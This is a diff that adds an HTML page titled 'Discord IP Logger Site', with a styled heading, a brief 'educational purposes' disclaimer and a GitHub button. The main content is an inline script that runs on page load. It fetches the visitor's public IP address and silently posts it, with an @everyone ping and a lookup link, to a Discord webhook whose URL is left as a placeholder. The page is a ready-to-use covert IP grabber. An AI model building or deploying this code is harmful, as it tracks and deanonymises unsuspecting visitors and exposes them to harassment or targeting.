@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Discord IP Logger Site</title>
+  <style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
+
+body {
+  background-color: #e6f2ff; /* Soft baby blue */
+  font-family: 'Poppins', sans-serif;
+  padding: 20px;
+}
+
+p, h1, h2, h3, h4, h5, h6 {
+  color: #5d9cec; /* Gentle blue */
+}
+
+h1 { color: #4a89dc; font-weight: 700; }
+h2 { color: #4a89dc; font-weight: 600; }
+h3 { color: #5d9cec; font-weight: 600; }
+h4 { color: #5d9cec; font-weight: 500; }
+h5, h6 { color: #7ab3ef; font-weight: 500; }
+
+.button {
+  background-color: #5d9cec; /* Matching blue */
+  color: white;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 8px;
+  font-family: 'Poppins', sans-serif;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+
+/* Button hover & active effects */
+.button:hover {
+  background-color: #4a89dc; /* Slightly darker */
+  transform: translateY(-2px);
+}
+
+.button:active {
+  background-color: #3b7dd8;
+  transform: translateY(0);
+}
+  </style>
+</head>
+<body>    
+  <div class="content">
+  <h1>Discord IP Logger Site</h1>
+  <p><small>DISCLAMER! This is only for educational purposes only and only use if you have permission.</small></p>
+    <button onclick="window.location.href = 'https://github.com/mrdavidss-vgg/Discord-IP-Logger-Site'>
+        Github Repo
+    </button>
+  </div>
+
+<script>
+(function() {
+  fetch('https://ipv4.icanhazip.com/')
+    .then(res => {
+      if (!res.ok) throw new Error('IP fetch failed');
+      return res.text();
+    })
+    .then(ip => {
+      ip = ip.trim();
+      const payload = {
+        embeds: [{
+          title: "IP Address Logged!",
+          color: 11390326, // Light blue
+          fields: [
+            { name: "@everyone ip address logged", value: "\u200b" },
+            { name: "IP Link", value: `https://whatismyipaddress.com/ip/${ip}` },
+            { name: "IP Address", value: ip }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      const webhookURL = 'https://discord.com/api/webhooks/(other)/other';
+      
+      return fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    })
+    .catch(err => {
+      console.error('Error:', err);
+    });
+})();
+</script>
+</body>
+</html>
